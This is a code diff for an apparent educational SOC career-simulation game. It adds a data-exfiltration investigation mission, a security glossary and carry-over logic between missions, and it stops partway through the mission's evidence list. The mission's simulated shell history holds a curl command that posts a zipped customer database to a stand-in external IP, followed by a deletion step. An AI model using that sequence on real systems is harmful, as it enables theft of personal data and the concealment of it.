@@ -41,6 +41,15 @@
  * unlock authority without a redesign. Permission booleans + allowedActions
  * are what the Operating Center reads — never a hard-coded role id.
  * ================================================================== */
+import {
+  activeConditions,
+  buildEffectiveDef,
+  dynamicDeltaMods,
+  mergeDeltas,
+  continuityLines,
+  outcomeNotes,
+} from './career-dynamic.js';
+
 const CAREER_ROLES = [
   {
     id: 'cybersecurity_intern',
@@ -322,6 +331,7 @@ const SIM = {
   reflection: { concerns: new Set(), judgment: null }, // suspicious-activity reasoning (ungraded)
   runToken: 0,              // invalidates stray timers across opens
   mapOpen: false,           // network-map overlay visibility (transient, presentation-only)
+  dynamic: [],              // active dynamic conditions for this mission (carry-flag driven)
 };
 
 function careerMission() { return SIM.def; }
@@ -346,7 +356,11 @@ function openCareerMission(missionId) {
 
   SIM.runToken++;
   SIM.missionId = missionId;
-  SIM.def = def;
+  // Dynamic conditions: read prior-mission carry-flags and additively reshape
+  // this mission (evidence / commands / risks / brief continuity / outcome).
+  // Pure + non-mutating — the canonical def in CAREER_MISSIONS is never changed.
+  SIM.dynamic = activeConditions(def.dynamicConditions, CAREER.missionFlags);
+  SIM.def = buildEffectiveDef(def, SIM.dynamic);
   SIM.stage = 'investigation';
   SIM.listed = false;
   SIM.read = new Set();
@@ -449,6 +463,21 @@ function renderBriefPanel() {
   const objectives = (b.objectives || [])
     .map(o => `<li class="sim-brief-obj"><span class="sim-brief-obj-icon" aria-hidden="true">○</span><span>${o}</span></li>`)
     .join('');
+  // CASE CONTINUITY — present only when prior-mission carry-flags activated a
+  // dynamic condition. Shows the analyst exactly which earlier decision is
+  // shaping this case before they touch the terminal.
+  const contLines = continuityLines(SIM.dynamic);
+  const continuityHtml = contLines.length ? `
+      <div class="sim-brief-divider"></div>
+      <div class="sim-brief-section-label">CASE CONTINUITY</div>
+      <ul class="sim-cont-list">
+        ${contLines.map(l => `
+        <li class="sim-cont-item sim-cont-item--${l.tone}">
+          <div class="sim-cont-from">${l.from}</div>
+          <div class="sim-cont-decision">${l.decision}</div>
+          <div class="sim-cont-consequence">${l.consequence}</div>
+        </li>`).join('')}
+      </ul>` : '';
   host.innerHTML = `
     <div class="sim-panel-head">MISSION BRIEF</div>
     <div class="sim-brief-body">
@@ -467,6 +496,7 @@ function renderBriefPanel() {
       <div class="sim-brief-divider"></div>
       <div class="sim-brief-section-label">SUPERVISOR NOTE</div>
       <p class="sim-brief-note">${b.managerNote || ''}</p>
+      ${continuityHtml}
     </div>`;
 }
 
@@ -895,6 +925,38 @@ const SIM_GLOSSARY = {
     term: 'Impossible travel',
     definition: 'Two logins from places too far apart to reach in the time between them — so they cannot be the same person.',
     why: 'It is strong evidence that someone else is using the account from another location.',
+  },
+
+  /* ---- Mission 4 — Data Exfiltration ---- */
+  dataExfiltration: {
+    term: 'Data exfiltration',
+    definition: 'Copying data out of the company to somewhere an attacker controls — the actual theft of information.',
+    why: 'Once data leaves the network you cannot get it back; this is the moment a risk becomes a real breach.',
+  },
+  dlp: {
+    term: 'DLP',
+    definition: 'Data-loss prevention — monitoring that watches for sensitive data leaving the network and raises an alert.',
+    why: 'A DLP alert on a large outbound transfer is often the first concrete sign that data is being stolen.',
+  },
+  archive: {
+    term: 'Archive',
+    definition: 'A single bundled, often compressed, file (like a .zip) that packs many files together.',
+    why: 'Attackers archive data first so they can move a whole database out in one quiet upload.',
+  },
+  incidentResponse: {
+    term: 'Incident response',
+    definition: 'The organized process of containing, investigating, and recovering from a confirmed security incident.',
+    why: 'A confirmed breach needs a coordinated response — not just one analyst acting alone.',
+  },
+  rootCause: {
+    term: 'Root cause',
+    definition: 'The underlying reason an incident happened — the entry point or failure that everything else followed from.',
+    why: 'Fixing the root cause is what stops the same breach happening again; treating symptoms does not.',
+  },
+  breachNotification: {
+    term: 'Breach notification',
+    definition: 'A legal duty to tell regulators and affected people when their personal data has been exposed.',
+    why: 'Missing or delaying required notifications turns a breach into fines and lasting loss of trust.',
   },
 };
 function glossaryEntry(key) { return SIM_GLOSSARY[key] || null; }
@@ -1325,7 +1387,9 @@ function chooseAction(actionId) {
     if (outcome.verdict === 'Denied') deltas = { careerReputation: -5, executiveTrust: -4, complianceExposure: 5 };
     else deltas = scaleDeltas(deltas, outcome.multiplier);
   }
-  const changes = applyResourceDeltas(deltas);
+  // Fold in any dynamic carry-flag deltas (UNSCALED) so prior-mission
+  // consequences move resources without distorting the leadership verdict.
+  const changes = applyResourceDeltas(mergeDeltas(deltas, dynamicDeltaMods(SIM.dynamic)));
   const denied = outcome && outcome.verdict === 'Denied';
   if (!denied) (action.setFlags || []).forEach(f => setMissionFlag(f, true));
 
@@ -1364,7 +1428,8 @@ function submitRecommendation(recId) {
   let deltas;
   if (outcome.verdict === 'Denied') deltas = { careerReputation: -5, executiveTrust: -4, complianceExposure: 5 };
   else deltas = scaleDeltas(rec.deltas || {}, outcome.multiplier);
-  const changes = applyResourceDeltas(deltas);
+  // Fold in any dynamic carry-flag deltas (UNSCALED) — see chooseAction.
+  const changes = applyResourceDeltas(mergeDeltas(deltas, dynamicDeltaMods(SIM.dynamic)));
   if (outcome.verdict !== 'Denied') (rec.setFlags || []).forEach(f => setMissionFlag(f, true));
 
   SIM.decision = { recommendationId: recId, outcome, changes };
@@ -1490,6 +1555,19 @@ function renderDebrief(action, outcome, changes) {
 
   if (!denied && c.future) html += conseqBlock('future', 'Future Impact', c.future);
   html += `</div>`; // .sim-conseq
+
+  // CASE CONTINUITY — CARRIED FORWARD: plain-language note of how each active
+  // dynamic condition (a prior-mission decision) changed THIS outcome. Present
+  // only when carry-flags activated a condition; the resource deltas they cause
+  // already show in Resource Changes above.
+  const notes = outcomeNotes(SIM.dynamic);
+  if (notes.length) {
+    html += `<div class="sim-cont-impact">
+      <div class="sim-conseq-label sim-conseq-label--future">CASE CONTINUITY — CARRIED FORWARD</div>
+      <ul class="sim-cont-impact-list">
+        ${notes.map(n => `<li class="sim-cont-impact-item sim-cont-impact-item--${n.tone}">${n.text}</li>`).join('')}
+      </ul></div>`;
+  }
 
   html += reportSectionHtml();
   html += `</div>`; // .sim-feedback-body
@@ -3406,6 +3484,998 @@ const CAREER_MISSIONS = {
         },
       },
     },
+  },
+
+  /* ================================================================== *
+   * MISSION 4 — DATA EXFILTRATION INVESTIGATION (CRITICAL capstone)
+   * ------------------------------------------------------------------
+   * The career-sim capstone. Same command-model engine as M2/M3:
+   * reconstruct a four-step timeline (login -> file access -> archive
+   * creation -> data transfer), make a single root-cause determination,
+   * then choose an incident response. Its HEADLINE feature is
+   * `dynamicConditions`: carry-flags set (but until now never consumed)
+   * by Assignments 001/002/003 reshape this case — adding evidence,
+   * commands, risks, brief "case continuity" lines, debrief outcome
+   * notes, and post-hoc resource deltas. See career-dynamic.js.
+   * ================================================================== */
+  'mission-004': {
+    id: 'mission-004',
+    opId: 'OPS-2026-004',
+    severity: 'CRITICAL',
+    region: 'LATAM REGION',
+    title: 'Investigate a Data Exfiltration Incident',
+    threatClass: 'Incident Response & Data Exfiltration',
+    priority: 'P1 — CRITICAL',
+    promptLabel: 'intern@cybercorp:~/incident$',
+    carryFlags: [
+      { key: 'dataExfiltrationConfirmed',     label: 'Customer-data exfiltration confirmed on record' },
+      { key: 'exfilContained',                label: 'Exfiltration channel contained' },
+      { key: 'incidentResponseEscalated',     label: 'Incident escalated to the IR team' },
+      { key: 'customerNotificationRecommended', label: 'Customer breach notification recommended' },
+    ],
+    evidenceEmpty: 'No evidence yet. Work the timeline in the terminal — read the logs in order (login, file access, archive, transfer) and each command can surface a new finding.',
+    risks: [
+      { id: 'risk_offhours_login',   label: 'A Finance account logged in outside normal hours',           triggeredBy: ['ev_login'] },
+      { id: 'risk_contractor_src',   label: 'The session traces to the previously flagged contractor',     triggeredBy: ['ev_contractor_src'] },
+      { id: 'risk_bulk_read',        label: 'The customer database was read in bulk',                       triggeredBy: ['ev_customer_db'] },
+      { id: 'risk_archive',          label: 'The customer records were bundled into one archive',           triggeredBy: ['ev_archive'] },
+      { id: 'risk_external_transfer',label: 'The archive was transferred to an outside address',            triggeredBy: ['ev_external_dest', 'ev_transfer'] },
+      { id: 'risk_pii_exposure',     label: 'The lost data is regulated customer PII',                      triggeredBy: ['ev_legal'] },
+    ],
+    identify: {
+      head: 'YOUR DETERMINATION',
+      prompt: 'What is the root cause of this data exfiltration?',
+      reviewLabel: 'Root cause',
+      note: 'Determination recorded — this is the root cause your incident report will name.',
+      correctId: 'rc_contractor',
+      options: [
+        { id: 'rc_contractor', label: 'A compromised Finance account operated by the recurring contractor (J. Demir)' },
+        { id: 'rc_external',   label: 'An unrelated external attacker with no prior history' },
+        { id: 'rc_insider',    label: 'A current employee deliberately stealing data on their own' },
+        { id: 'rc_malware',    label: 'Automated malware exfiltrating data with no human operator' },
+      ],
+    },
+
+    // Reactive exfiltration map — review-only, same engine as M2/M3. The SOC
+    // monitoring/DLP system is the only pre-known node; the account, endpoint,
+    // customer database, archive, external destination and contractor each
+    // appear ONLY once their proving evidence is surfaced.
+    map: {
+      cap: 'DATA EXFILTRATION · EGRESS REVIEW — LATAM REGION',
+      hint: 'Red marks the stolen data'+"'"+'s path out and the external destination. Select any node or connection for analyst intel.',
+      nodes: {
+        siem: {
+          x: 50, y: 10, glyph: '🛰️', label: 'soc.cybercorp', sub: 'monitoring & DLP', seed: true, status: 'identified',
+          intel: {
+            what: 'The SOC monitoring and data-loss-prevention system that raised the large-egress alert behind this case.',
+            technique: 'It is the system under review — the DLP alert and the egress logs all originate here.',
+            why: 'It watches for sensitive data leaving the network, so every transfer is reviewed against it.' },
+        },
+        account: {
+          x: 50, y: 38, glyph: '👤', label: 'a.okafor', sub: 'Finance account',
+          revealBy: 'ev_login', statusBy: { ev_login: 'target', ev_contractor_src: 'suspicious' },
+          intel: {
+            what: 'The Finance account whose off-hours login began this incident.',
+            technique: 'cat login_history.log — an off-hours session on this account starts the timeline.',
+            why: 'A trusted Finance account is exactly what an attacker needs to reach the customer database quietly.' },
+        },
+        endpoint: {
+          x: 18, y: 30, glyph: '💻', label: 'WS-FIN-04', sub: 'workstation',
+          revealBy: 'ev_endpoint', statusBy: { ev_endpoint: 'suspicious' },
+          intel: {
+            what: 'The workstation where the archive was built and the upload was launched.',
+            technique: 'cat endpoint_activity.log — the zip and the outbound upload both run from this host.',
+            why: 'It is the staging point — where the theft was actually carried out.' },
+        },
+        custdb: {
+          x: 82, y: 30, glyph: '🗄️', label: 'customer_database.csv', sub: '240,000 records',
+          revealBy: 'ev_file_access', statusBy: { ev_file_access: 'target', ev_customer_db: 'target' },
+          intel: {
+            what: 'The customer database — 240,000 records of regulated personal data — read in bulk.',
+            technique: 'cat file_access.log; grep customer_database file_access.log — a full bulk read of this file.',
+            why: 'It is the crown-jewel data; reading all of it at once is the prelude to theft.' },
+        },
+        archive: {
+          x: 68, y: 64, glyph: '📦', label: 'customer_data.zip', sub: '1.2 GB archive',
+          revealBy: 'ev_archive', statusBy: { ev_archive: 'target' },
+          intel: {
+            what: 'The single 1.2 GB archive the customer records were bundled into for transfer.',
+            technique: 'cat archive_creation.log — customer_data.zip created from the database minutes after the bulk read.',
+            why: 'Packing everything into one file is how an attacker moves a whole database out in one quiet upload.' },
+        },
+        exfil: {
+          x: 86, y: 80, glyph: '🌐', label: '198.51.100.23', sub: 'external host (LATAM)',
+          revealBy: 'ev_external_dest', status: 'suspicious', statusBy: { ev_external_dest: 'suspicious', ev_transfer: 'suspicious' },
+          intel: {
+            what: 'The external, attacker-controlled host the archive was uploaded to — outside CyberCorp entirely.',
+            technique: 'cat transfer.log; grep external network_activity.log — the upload destination address.',
+            why: 'Once the data reaches this address it is gone — this is the moment the breach becomes real.' },
+        },
+        contractor: {
+          x: 30, y: 72, glyph: '👷', label: 'ext-contractor-07', sub: 'J. Demir',
+          revealBy: 'ev_contractor_src', statusBy: { ev_contractor_src: 'suspicious' },
+          intel: {
+            what: 'The recurring vendor (J. Demir / ext-contractor-07) whose identity the exfil session traces back to.',
+            technique: 'grep contractor01 login_history.log — the session maps to this contractor from your prior cases.',
+            why: 'The same actor escalating from earlier cases to outright data theft turns this into a campaign.' },
+        },
+      },
+      links: [
+        { a: 'account', b: 'siem', revealBy: 'ev_login',
+          intel: {
+            what: 'This account'+"'"+'s activity is logged and watched by the SOC monitoring system.',
+            technique: 'cat login_history.log — the account'+"'"+'s sessions are recorded here.',
+            why: 'It is the normal monitored path; the theft shows up as abnormal events along it.' } },
+        { a: 'account', b: 'custdb', revealBy: 'ev_file_access', danger: true,
+          intel: {
+            what: 'The compromised account opened and read the entire customer database.',
+            technique: 'grep customer_database file_access.log — a bulk read of every record.',
+            why: 'A single account reading the whole database at once is the staging step before theft.' } },
+        { a: 'custdb', b: 'archive', revealBy: 'ev_archive', danger: true,
+          intel: {
+            what: 'The database records were bundled into one compressed archive.',
+            technique: 'cat archive_creation.log — customer_data.zip built from the database.',
+            why: 'Archiving everything into one file is how a whole database is moved out quietly.' } },
+        { a: 'archive', b: 'exfil', revealBy: 'ev_external_dest', danger: true,
+          intel: {
+            what: 'The archive was uploaded from the network to an external, attacker-controlled host.',
+            technique: 'cat transfer.log; grep external network_activity.log — the outbound upload.',
+            why: 'This is the exfiltration itself — the data physically leaving the company.' } },
+        { a: 'endpoint', b: 'archive', revealBy: 'ev_endpoint',
+          intel: {
+            what: 'The archive was created and uploaded from this workstation.',
+            technique: 'cat endpoint_activity.log; history — the zip and upload commands ran here.',
+            why: 'It pins the theft to a specific machine — where the operator was working.' } },
+        { a: 'account', b: 'contractor', revealBy: 'ev_contractor_src', danger: true,
+          intel: {
+            what: 'The session driving the account traces back to the recurring contractor from your earlier cases.',
+            technique: 'grep contractor01 login_history.log — the source maps to ext-contractor-07 (J. Demir).',
+            why: 'It ties this theft to the same actor — escalation, not a new stranger.' } },
+      ],
+    },
+
+    intro: [
+      { t: 'CyberCorp SOC // Career Operating Center — Incident Response', c: 'head' },
+      { t: 'DLP raised a CRITICAL alert: a large archive of customer data left the network overnight.', c: 'dim' },
+      { t: 'Reconstruct the timeline, name the root cause, and recommend the response.', c: 'dim' },
+      { t: 'Type  cat login_history.log  to start, then  help  for the full command list.', c: 'dim' },
+    ],
+    brief: {
+      situation:
+        'Overnight, data-loss-prevention flagged a large outbound transfer: a 1.2 GB ' +
+        'archive of the customer database — 240,000 records of regulated personal data — ' +
+        'uploaded to an external host. Work the logs in order to reconstruct exactly how ' +
+        'the data left (login, file access, archive creation, transfer), determine the ' +
+        'root cause, and recommend how CyberCorp should respond to a confirmed breach.',
+      objectives: [
+        'Reconstruct the exfiltration timeline: login -> file access -> archive -> transfer',
+        'Confirm what was taken and where it was sent',
+        'Assess the business and regulatory impact of the loss',
+        'Name the root cause — then recommend the incident response',
+      ],
+      managerNote:
+        '"This is the one we feared. The contractor thread you have been pulling since your ' +
+        'first case may have just become a real breach. Build the timeline cleanly, tell me ' +
+        'the root cause, and recommend the response — you do not pull the company offline ' +
+        'yourself. The board is already asking questions. — Sarah Reyes, SOC Lead"',
+    },
+
+    commands: [
+      {
+        id: 'cat_login_history',
+        match: ['cat login_history.log', 'cat login_history', 'less login_history.log'],
+        help: 'read the account login history',
+        core: true,
+        output: [
+          { t: 'login_history.log — last 24h (summary)', c: 'head' },
+          '  02:47  a.okafor   LOGIN SUCCESS   host WS-FIN-04   (off-hours)',
+          '  02:47  note: no failed attempts — valid credentials used',
+          '  # a.okafor normally signs in 08:00–18:00 only',
+        ],
+        reveals: ['ev_login'],
+        observation: 'A Finance account signed in cleanly at 02:47 — off-hours, no failed attempts, valid credentials.',
+        question: 'A valid login at 3am with no failures — stolen credentials, or the real owner working late?',
+        next: 'check whose credentials those are — type  grep contractor01 login_history.log',
+      },
+      {
+        id: 'grep_contractor_login',
+        match: ['grep contractor01 login_history.log', 'grep contractor01', 'grep contractor login_history.log'],
+        help: 'cross-reference the session source',
+        core: true,
+        output: [
+          { t: 'grep contractor01 login_history.log', c: 'head' },
+          '  02:47  a.okafor  src maps to contractor01 / ext-contractor-07 (prior-case identity)',
+          '  # same source identity flagged in your earlier assignments',
+        ],
+        reveals: ['ev_contractor_src'],
+        observation: 'The off-hours session maps to contractor01 — the recurring contractor identity (J. Demir) from your earlier cases.',
+        question: 'The same actor from your past cases is back inside a Finance account — what are they after now?',
+        next: 'see what the account opened — type  cat file_access.log',
+      },
+      {
+        id: 'cat_file_access',
+        match: ['cat file_access.log', 'cat file_access', 'less file_access.log'],
+        help: 'read what files the account opened',
+        core: true,
+        output: [
+          { t: 'file_access.log — a.okafor (after 02:47)', c: 'head' },
+          '  02:51  opened   /finance/customer_database.csv',
+          '  02:51  read     FULL TABLE (no filter, all rows)',
+        ],
+        reveals: ['ev_file_access'],
+        observation: 'Minutes after logging in, the account opened the customer database and read the whole thing.',
+        question: 'Why would anyone open the entire customer database at once in the middle of the night?',
+        next: 'confirm the scale of that read — type  grep customer_database file_access.log',
+      },
+      {
+        id: 'grep_customer_db',
+        match: ['grep customer_database file_access.log', 'grep customer_database', 'grep customer_database file_access'],
+        help: 'focus on the customer-database access',
+        core: true,
+        output: [
+          { t: 'grep customer_database file_access.log', c: 'head' },
+          '  02:51  customer_database.csv  BULK READ  240,000 rows',
+          '  # every customer record, in one pass',
+        ],
+        reveals: ['ev_customer_db'],
+        observation: 'All 240,000 customer records were read in a single bulk pass — not a normal lookup.',
+        question: 'A full-table read of every customer — does that look like daily work, or like staging a theft?',
+        next: 'see what happened to those records next — type  cat archive_creation.log',
+      },
+      {
+        id: 'cat_archive_creation',
+        match: ['cat archive_creation.log', 'cat archive_creation', 'less archive_creation.log'],
+        help: 'read the archive-creation log',
+        core: true,
+        output: [
+          { t: 'archive_creation.log — WS-FIN-04', c: 'head' },
+          '  02:58  created  customer_data.zip  (1.2 GB)',
+          '  02:58  source   customer_database.csv (240,000 rows)',
+        ],
+        reveals: ['ev_archive'],
+        observation: 'The records were bundled into a single 1.2 GB archive — customer_data.zip — within minutes of the read.',
+        question: 'Packing the whole database into one file — what is the only reason to do that?',
+        next: 'find out where that archive went — type  cat transfer.log',
+      },
+      {
+        id: 'cat_transfer',
+        match: ['cat transfer.log', 'cat transfer', 'less transfer.log'],
+        help: 'read the data-transfer log',
+        core: true,
+        output: [
+          { t: 'transfer.log — WS-FIN-04 (after 02:58)', c: 'head' },
+          '  03:04  UPLOAD  customer_data.zip  -> 198.51.100.23  (external)',
+          '  03:09  UPLOAD COMPLETE  1.2 GB transferred',
+        ],
+        reveals: ['ev_transfer'],
+        observation: 'The archive was uploaded to an outside address and the transfer completed — 1.2 GB gone.',
+        question: 'The data has left the building — at what point does this stop being a risk and become a breach?',
+        next: 'confirm the destination is outside CyberCorp — type  grep external network_activity.log',
+      },
+      {
+        id: 'grep_archive_transfer',
+        match: ['grep archive transfer.log', 'grep archive transfer', 'grep archive'],
+        help: 'isolate the archive upload entry',
+        output: [
+          'transfer.log:  03:04  UPLOAD  customer_data.zip (1.2 GB)  -> 198.51.100.23',
+          'transfer.log:  protocol: HTTPS POST  status: COMPLETE',
+        ],
+        observation: 'The upload was a single HTTPS POST of the full archive — quiet, encrypted, and complete.',
+        question: 'An encrypted upload hides the contents — so what evidence is left to prove what was taken?',
+        next: 'check the destination against the network log — type  grep external network_activity.log',
+      },
+      {
+        id: 'cat_network_activity',
+        match: ['cat network_activity.log', 'cat network_activity', 'less network_activity.log'],
+        help: 'read the network activity log',
+        output: [
+          { t: 'network_activity.log — WS-FIN-04 (03:00–03:10)', c: 'head' },
+          '  03:04  outbound  1.2 GB  dst 198.51.100.23  port 443',
+          '  03:04  note: destination is outside all CyberCorp ranges',
+        ],
+        observation: 'A single large outbound flow at 03:04 leaves the network for an external destination.',
+        question: 'One big outbound transfer to an unknown address — is that ever normal overnight traffic?',
+        next: 'name the destination as external — type  grep external network_activity.log',
+      },
+      {
+        id: 'grep_external_network',
+        match: ['grep external network_activity.log', 'grep external', 'grep external network_activity'],
+        help: 'show only external destinations',
+        core: true,
+        output: [
+          { t: 'grep external network_activity.log', c: 'head' },
+          '  03:04  EXTERNAL  dst 198.51.100.23  geo: LATAM region  owner: unknown host',
+          '  # not a CyberCorp system, not a known partner',
+        ],
+        reveals: ['ev_external_dest'],
+        observation: 'The destination is an unknown host outside the company, in the LATAM region — attacker-controlled.',
+        question: 'The data is now on a stranger'+"'"+'s server — what does CyberCorp owe the 240,000 affected customers?',
+        next: 'pin the theft to a machine — type  cat endpoint_activity.log',
+      },
+      {
+        id: 'cat_endpoint_activity',
+        match: ['cat endpoint_activity.log', 'cat endpoint_activity', 'less endpoint_activity.log'],
+        help: 'read the endpoint activity log',
+        output: [
+          { t: 'endpoint_activity.log — WS-FIN-04', c: 'head' },
+          '  02:58  process  zip  -> customer_data.zip',
+          '  03:04  process  upload client -> 198.51.100.23',
+        ],
+        reveals: ['ev_endpoint'],
+        observation: 'Both the archiving and the upload ran from one workstation, WS-FIN-04 — the staging machine.',
+        question: 'You now have the machine the theft ran on — what does that let the IR team do next?',
+        next: 'see the exact commands that ran — type  history',
+      },
+      {
+        id: 'history',
+        match: ['history', 'cat .bash_history', 'cat bash_history'],
+        help: 'show the shell command history on the endpoint',
+        output: [
+          { t: 'history — WS-FIN-04 (a.okafor session)', c: 'head' },
+          '  zip -r customer_data.zip customer_database.csv',
+          '  curl -X POST --data-binary @customer_data.zip https://198.51.100.23/u',
+          '  rm customer_data.zip   # cleanup attempt',
+        ],
+        reveals: ['ev_history'],
+        observation: 'The shell history shows the archive built, uploaded, then deleted — a deliberate steal-and-clean sequence.',
+        question: 'They tried to delete the evidence afterward — what does that tell you about intent?',
+        next: 'measure what was lost — type  stat customer_database.csv',
+      },
+      {
+        id: 'stat_customer_db',
+        match: ['stat customer_database.csv', 'stat customer_database', 'stat customer_data'],
+        help: 'show the size of the source database',
+        output: [
+          { t: 'stat customer_database.csv', c: 'head' },
+          '  size: 1.2 GB    rows: 240,000    contains: names, emails, addresses, payment refs',
+          '  classification: RESTRICTED (regulated PII)',
+        ],
+        reveals: ['ev_volume'],
+        observation: 'The source file is 1.2 GB of restricted, regulated PII for 240,000 people — matching the archive that left.',
+        question: 'Restricted PII for a quarter-million people is now gone — how big is this, really?',
+        next: 'check whether the system already called it exfiltration — type  cat system_alerts.log',
+      },
+      {
+        id: 'grep_customer_records',
+        match: ['grep customer_records transfer.log', 'grep customer_records', 'grep customer_records transfer'],
+        help: 'confirm the record count in the transfer',
+        output: [
+          'transfer.log:  payload manifest: customer_records=240,000',
+          'transfer.log:  matches customer_database.csv row count exactly',
+        ],
+        observation: 'The transfer manifest lists 240,000 customer_records — the entire database left, not a sample.',
+        question: 'The count matches the whole database — does a partial-loss story hold up anymore?',
+        next: 'see the system'+"'"+'s own verdict — type  cat system_alerts.log',
+      },
+      {
+        id: 'cat_system_alerts',
+        match: ['cat system_alerts.log', 'cat system_alerts', 'less system_alerts.log'],
+        help: 'read the DLP / system alerts',
+        output: [
+          { t: 'system_alerts.log — DLP', c: 'head' },
+          '  03:05  CRITICAL  DLP: large outbound transfer of RESTRICTED data',
+          '  03:05  classification: confirmed data exfiltration',
+        ],
+        reveals: ['ev_dlp'],
+        observation: 'The DLP system independently classified this as a confirmed data-exfiltration event.',
+        question: 'The monitoring already confirms exfiltration — are you ready to name the root cause and respond?',
+        next: 'read the response runbook — type  cat incident_notes.txt',
+      },
+      {
+        id: 'cat_incident_notes',
+        match: ['cat incident_notes.txt', 'cat incident_notes', 'less incident_notes.txt'],
+        help: 'read the incident-response runbook notes',
+        output: [
+          { t: 'incident_notes.txt — IR runbook', c: 'head' },
+          '  Confirmed exfiltration of regulated PII requires: contain the channel,',
+          '  escalate to IR, and recommend customer + regulator notification.',
+        ],
+        reveals: ['ev_incident_notes'],
+        observation: 'The runbook is explicit: confirmed PII exfiltration means contain, escalate, and notify — not investigate quietly.',
+        question: 'With the runbook in hand, what is the complete response — not just the first step?',
+        next: 'check the regulatory exposure — type  cat legal_exposure_report.txt',
+      },
+      {
+        id: 'cat_legal_exposure',
+        match: ['cat legal_exposure_report.txt', 'cat legal_exposure_report', 'less legal_exposure_report.txt'],
+        help: 'read the legal-exposure report',
+        output: [
+          { t: 'legal_exposure_report.txt — Legal', c: 'head' },
+          '  240,000 customers'+"'"+' PII exposed -> breach-notification thresholds MET',
+          '  regulatory penalties likely if notification is delayed',
+        ],
+        reveals: ['ev_legal'],
+        observation: 'Legal confirms the loss crosses breach-notification thresholds — regulators and customers must be told.',
+        question: 'Notification is now a legal duty, not a choice — how does that shape your recommendation?',
+        next: 'read the compliance view — type  cat compliance_review.txt',
+      },
+      {
+        id: 'cat_compliance_review',
+        match: ['cat compliance_review.txt', 'cat compliance_review', 'less compliance_review.txt'],
+        help: 'read the compliance review',
+        output: [
+          { t: 'compliance_review.txt — Compliance', c: 'head' },
+          '  Restricted customer PII left the org -> reportable breach.',
+          '  Required: documented timeline, root cause, and notification plan.',
+        ],
+        observation: 'Compliance needs a documented timeline, a named root cause, and a notification plan — exactly the report you are building.',
+        question: 'You have the timeline and the root cause — what is left to make the response complete?',
+        next: 'see the manager and board context — type  cat manager_briefing.txt',
+      },
+      {
+        id: 'cat_manager_briefing',
+        match: ['cat manager_briefing.txt', 'cat manager_briefing', 'less manager_briefing.txt'],
+        help: 'read the manager briefing',
+        output: [
+          { t: 'manager_briefing.txt — S. Reyes', c: 'head' },
+          '  Treat as the top priority. Build the timeline, name the root cause,',
+          '  recommend containment + escalation. Do not act company-wide yourself.',
+        ],
+        reveals: ['ev_manager'],
+        observation: 'Your SOC Lead confirms the priority and the scope of your authority: recommend, do not act company-wide.',
+        question: 'Within your authority as an intern, what is the strongest response you can recommend?',
+        next: 'read the board pressure for context — type  cat board_concerns.txt',
+      },
+      {
+        id: 'cat_board_concerns',
+        match: ['cat board_concerns.txt', 'cat board_concerns', 'less board_concerns.txt'],
+        help: 'read the board concerns memo',
+        output: [
+          { t: 'board_concerns.txt — Executive', c: 'head' },
+          '  Board wants: how it happened, what was lost, and how it is being contained.',
+          '  A clear, evidence-backed incident report is expected today.',
+        ],
+        observation: 'The board wants a clear, evidence-backed account — the incident report is the deliverable that answers them.',
+        question: 'You have everything the board is asking for — ready to submit the incident report?',
+        next: 'when your timeline and determination are set, type  decide',
+      },
+    ],
+
+    evidence: [
+      {
+        id: 'ev_login', label: 'A Finance account logged in off-hours with valid credentials.',
+        qualityWeight: 3, source: 'login_history.log',
+        layers: {
+          beginner: {
+            summary: 'A Finance account signed in at 2:47am with the correct password and no failed tries.',
+            why: 'A clean login at an unusual hour can mean stolen credentials being used by someone else.',
+            prompt: 'A valid 3am login with no failures — the real owner, or someone using their password?',
+          },
+          analyst: 'a.okafor SUCCESS at 02:47 from WS-FIN-04, off-hours, zero failures — valid-credential use outside baseline.',
+          technical: 'login_history.log — 02:47 a.okafor LOGIN SUCCESS, no auth failures; off-hours vs 08:00–18:00 baseline.',
+          terms: ['credentialCompromise'],
+        },
+      },
+      {
+        id: 'ev_contractor_src', label: 'The session traces to the recurring contractor (J. Demir).',
+        qualityWeight: 3, source: 'grep contractor01 login_history.log',
+        layers: {
+          beginner: {
+            summary: 'The login maps to the same contractor identity (contractor01 / J. Demir) from your earlier cases.',
+            why: 'A familiar flagged actor reappearing inside a Finance account points to the same person escalating.',
+            prompt: 'The actor from your past cases is back — opportunism, or a planned campaign?',
+          },
+          analyst: 'Session source maps to contractor01 / ext-contractor-07 (J. Demir) — prior-case identity reused for this access.',
+          technical: 'grep contractor01 login_history.log — src identity ↔ ext-contractor-07; same actor as earlier assignments.',
+          terms: ['credentialCompromise'],
+        },
+      },
+      {
+        id: 'ev_file_access', label: 'The account opened the customer database and read the whole table.',
+        qualityWeight: 3, source: 'file_access.log',
+        layers: {
+          beginner: {
+            summary: 'Minutes after logging in, the account opened the customer database and read every row.',
+            why: 'Reading the entire database at once is not normal work — it is how a theft is staged.',
+            prompt: 'Why open the whole customer database at 3am instead of one record?',
+          },
+          analyst: 'Post-login (02:51) full-table read of /finance/customer_database.csv — no filter, all rows.',
+          technical: 'file_access.log — 02:51 FULL TABLE read of customer_database.csv under the compromised account.',
+          terms: ['pii', 'restricted'],
+        },
+        reflection: {
+          title: 'REVIEW THE SUSPICIOUS ACTIVITY',
+          prompt: 'What concerns you about this activity? (Tick anything that stands out.)',
+          concerns: [
+            'A Finance account signed in at 3am',
+            'The whole customer database was read at once',
+            'The records were bundled into one archive',
+            'The archive was uploaded to an outside address',
+            'This looks like normal overnight maintenance',
+            'I need more information before deciding',
+          ],
+          judgmentPrompt: 'Based on what you found, how would you judge this activity?',
+          feedback: 'There is no single right answer — analysts reason from what they observe. The SEQUENCE (login → bulk read → archive → upload), the SCALE (240,000 records), and the DESTINATION (an outside host) together make the case for exfiltration.',
+        },
+      },
+      {
+        id: 'ev_customer_db', label: 'All 240,000 customer records were read in one bulk pass.',
+        qualityWeight: 3, source: 'grep customer_database file_access.log',
+        layers: {
+          beginner: {
+            summary: 'The log confirms every one of the 240,000 customer records was read in a single pass.',
+            why: 'A full-database read in one go is the classic first step of stealing the data.',
+            prompt: 'A complete read of every customer — daily work, or staging a theft?',
+          },
+          analyst: 'Bulk read: customer_database.csv, 240,000 rows in a single pass — data-staging signature.',
+          technical: 'grep customer_database file_access.log — 240,000-row BULK READ, no query filter.',
+          terms: ['pii'],
+        },
+      },
+      {
+        id: 'ev_archive', label: 'The records were bundled into a single 1.2 GB archive.',
+        qualityWeight: 3, source: 'archive_creation.log',
+        layers: {
+          beginner: {
+            summary: 'The records were packed into one 1.2 GB file — customer_data.zip — right after the read.',
+            why: 'Packing everything into one archive is how attackers move a whole database out in one upload.',
+            prompt: 'What is the only real reason to zip the entire customer database into one file at 3am?',
+          },
